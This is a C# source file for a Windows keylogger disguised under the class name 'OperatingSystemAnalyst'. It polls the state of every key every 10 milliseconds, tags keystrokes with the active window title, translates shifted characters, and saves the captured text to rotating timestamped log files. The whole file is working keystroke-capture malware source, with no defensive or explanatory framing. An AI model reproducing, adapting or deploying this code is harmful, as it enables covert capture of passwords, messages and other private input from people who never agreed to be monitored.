using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Linq;

namespace OperatingSystemAnalyst
{
    public class OperatingSystemAnalyst
    {
        #region Import
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();
        #endregion

        #region Attributes
        public const int MAX_LOG_FILES = 10;
        private ScanMode _mode;
        private string keyBuffer;
        private System.Timers.Timer _timerKeyMine;
        private System.Timers.Timer _timerBufferFlush;
        private string hWndTitle;
        private string _hWndTitlePast;
        private bool _tglAlt = false;
        private bool _tglControl = false;
        private bool _tglCapslock = false;
        private string _fileLogName;
        #endregion

        #region Properties
        public ScanMode Mode
        {
            get { return _mode; }
            set { _mode = value; }
        }
        public string FileLogName
        {
            get { return _fileLogName; }
            set { _fileLogName = value; }
        }
        public bool Enabled
        {
            get
            {
                return _timerKeyMine.Enabled && _timerBufferFlush.Enabled;
            }
            set
            {
                _timerKeyMine.Enabled = _timerBufferFlush.Enabled = value;
            }
        }
        public double FlushInterval
        {
            get
            {
                return _timerBufferFlush.Interval;
            }
            set
            {
                _timerBufferFlush.Interval = value;
            }
        }
        public double MineInterval
        {
            get
            {
                return _timerKeyMine.Interval;
            }
            set
            {
                _timerKeyMine.Interval = value;
            }
        }
        public static bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); }
        } // ControlKey
        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
        } // ShiftKey
        public static bool CapsLock
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000); }
        } // CapsLock
        public static bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); }
        } // AltKey
        #endregion

        #region Constructor
        public OperatingSystemAnalyst()
        {
            hWndTitle = ActiveApplTitle();
            _hWndTitlePast = hWndTitle;
            _fileLogName = "OperatingSystemAnalyst";

            //
            // keyBuffer
            //
            keyBuffer = "";

            // 
            // timerKeyMine
            // 
            this._timerKeyMine = new System.Timers.Timer();
            this._timerKeyMine.Enabled = true;
            this._timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this._timerKeyMine.Interval = 10;

            // 
            // timerBufferFlush
            //
            this._timerBufferFlush = new System.Timers.Timer();
            this._timerBufferFlush.Enabled = true;
            this._timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
            //this.timerBufferFlush.Interval = 1800000; // 30 minutes
            this._timerBufferFlush.Interval = 180000; // 3 minutes
        }
        #endregion

        #region Methods public
        public static string ActiveApplTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
            if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }
        public void Flush2Console(string data, bool writeLine)
        {
            if (writeLine)
                Console.WriteLine(data);
            else
            {
                Console.Write(data);
                keyBuffer = ""; // reset
            }
        }
        public void Flush2File()
        {
            string file = _fileLogName;
            string AmPm = "";
            try
            {
                if (Mode == ScanMode.HOUR)
                {
                    if (DateTime.Now.TimeOfDay.Hours >= 0 && DateTime.Now.TimeOfDay.Hours <= 11)
                        AmPm = "AM";
                    else
                        AmPm = "PM";
                    file += "_" + DateTime.Now.ToString("hh") + AmPm + ".log";
                }
                else
                    file += "_" + DateTime.Now.ToString("yyyy.MM.dd") + ".log";

                FileStream fil = new FileStream(file, FileMode.Append, FileAccess.Write);
                using (StreamWriter sw = new StreamWriter(fil))
                {
                    sw.Write(keyBuffer);
                }
                PurgeOldLogFiles();
                keyBuffer = ""; // reset
            }
            catch (Exception ex)
            {
                Console.WriteLine(" => SysKey crash : " + ex.Message);
                //throw;
            }
        }
        public void PurgeOldLogFiles()
        {
            string[] files = Directory.GetFiles("./").Where(f => f.EndsWith(".log")).OrderBy(f => f).ToArray();
            if (files.Length > MAX_LOG_FILES)
            {
                for (int i = 0; i < files.Length - MAX_LOG_FILES ; i++)
                {
                    File.Delete(files[i]);
                }
            }
        }
        #endregion

        #region Methods private
        private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (Mode == ScanMode.FILE)
            {
                if (keyBuffer.Length > 0)
                    Flush2File();
            }
            else
            {
                if (keyBuffer.Length > 0)
                    Flush2Console(keyBuffer, false);
            }
        }
        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            hWndTitle = ActiveApplTitle();

            if (hWndTitle != _hWndTitlePast)
            {
                if (Mode == ScanMode.FILE)
                    keyBuffer += "[" + DateTime.Now + ":" + hWndTitle + "]";
                else
                {
                    Flush2Console("[" + DateTime.Now + ":" + hWndTitle + "]", true);
                    if (keyBuffer.Length > 0)
                        Flush2Console(keyBuffer, false);
                }
                _hWndTitlePast = hWndTitle;
            }

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    //Console.WriteLine(i.ToString()); // Outputs the pressed key code [Debugging purposes]


                    if (ControlKey)
                    {
                        if (!_tglControl)
                        {
                            _tglControl = true;
                            keyBuffer += "<Ctrl=On>";
                        }
                    }
                    else
                    {
                        if (_tglControl)
                        {
                            _tglControl = false;
                            keyBuffer += "<Ctrl=Off>";
                        }
                    }

                    if (AltKey)
                    {
                        if (!_tglAlt)
                        {
                            _tglAlt = true;
                            keyBuffer += "<Alt=On>";
                        }
                    }
                    else
                    {
                        if (_tglAlt)
                        {
                            _tglAlt = false;
                            keyBuffer += "<Alt=Off>";
                        }
                    }

                    if (CapsLock)
                    {
                        if (!_tglCapslock)
                        {
                            _tglCapslock = true;
                            keyBuffer += "<CapsLock=On>";
                        }
                    }
                    else
                    {
                        if (_tglCapslock)
                        {
                            _tglCapslock = false;
                            keyBuffer += "<CapsLock=Off>";
                        }
                    }

                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        keyBuffer += "<LMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        keyBuffer += "<RMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        keyBuffer += "<Backspace>";
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        keyBuffer += " ";
                    else if (Enum.GetName(typeof(Keys), i) == "Return")
                        keyBuffer += "<Enter>";
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        keyBuffer += "<Del>";
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        keyBuffer += "<Ins>";
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        keyBuffer += "<Home>";
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        keyBuffer += "<End>";
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        keyBuffer += "<Tab>";
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        keyBuffer += "<Page Up>";
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        keyBuffer += "<Page Down>";
                    else if (Enum.GetName(typeof(Keys), i) == "LWin" || Enum.GetName(typeof(Keys), i) == "RWin")
                        keyBuffer += "<Win>";

                    /* ********************************************** *
                     * Detect key based off ShiftKey Toggle
                     * ********************************************** */
                    if (ShiftKey)
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)i;
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "!";
                        else if (i.ToString() == "50")
                            keyBuffer += "@";
                        else if (i.ToString() == "51")
                            keyBuffer += "#";
                        else if (i.ToString() == "52")
                            keyBuffer += "$";
                        else if (i.ToString() == "53")
                            keyBuffer += "%";
                        else if (i.ToString() == "54")
                            keyBuffer += "^";
                        else if (i.ToString() == "55")
                            keyBuffer += "&";
                        else if (i.ToString() == "56")
                            keyBuffer += "*";
                        else if (i.ToString() == "57")
                            keyBuffer += "(";
                        else if (i.ToString() == "48")
                            keyBuffer += ")";
                        else if (i.ToString() == "192")
                            keyBuffer += "~";
                        else if (i.ToString() == "189")
                            keyBuffer += "_";
                        else if (i.ToString() == "187")
                            keyBuffer += "+";
                        else if (i.ToString() == "219")
                            keyBuffer += "{";
                        else if (i.ToString() == "221")
                            keyBuffer += "}";
                        else if (i.ToString() == "220")
                            keyBuffer += "|";
                        else if (i.ToString() == "186")
                            keyBuffer += ":";
                        else if (i.ToString() == "222")
                            keyBuffer += "\"";
                        else if (i.ToString() == "188")
                            keyBuffer += "<";
                        else if (i.ToString() == "190")
                            keyBuffer += ">";
                        else if (i.ToString() == "191")
                            keyBuffer += "?";
                    }
                    else
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)(i + 32);
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "1";
                        else if (i.ToString() == "50")
                            keyBuffer += "2";
                        else if (i.ToString() == "51")
                            keyBuffer += "3";
                        else if (i.ToString() == "52")
                            keyBuffer += "4";
                        else if (i.ToString() == "53")
                            keyBuffer += "5";
                        else if (i.ToString() == "54")
                            keyBuffer += "6";
                        else if (i.ToString() == "55")
                            keyBuffer += "7";
                        else if (i.ToString() == "56")
                            keyBuffer += "8";
                        else if (i.ToString() == "57")
                            keyBuffer += "9";
                        else if (i.ToString() == "48")
                            keyBuffer += "0";
                        else if (i.ToString() == "189")
                            keyBuffer += "-";
                        else if (i.ToString() == "187")
                            keyBuffer += "=";
                        else if (i.ToString() == "92")
                            keyBuffer += "`";
                        else if (i.ToString() == "219")
                            keyBuffer += "[";
                        else if (i.ToString() == "221")
                            keyBuffer += "]";
                        else if (i.ToString() == "220")
                            keyBuffer += "\\";
                        else if (i.ToString() == "186")
                            keyBuffer += ";";
                        else if (i.ToString() == "222")
                            keyBuffer += "'";
                        else if (i.ToString() == "188")
                            keyBuffer += ",";
                        else if (i.ToString() == "190")
                            keyBuffer += ".";
                        else if (i.ToString() == "191")
                            keyBuffer += "/";
                    }
                }
            }
        }
        #endregion
    }
}
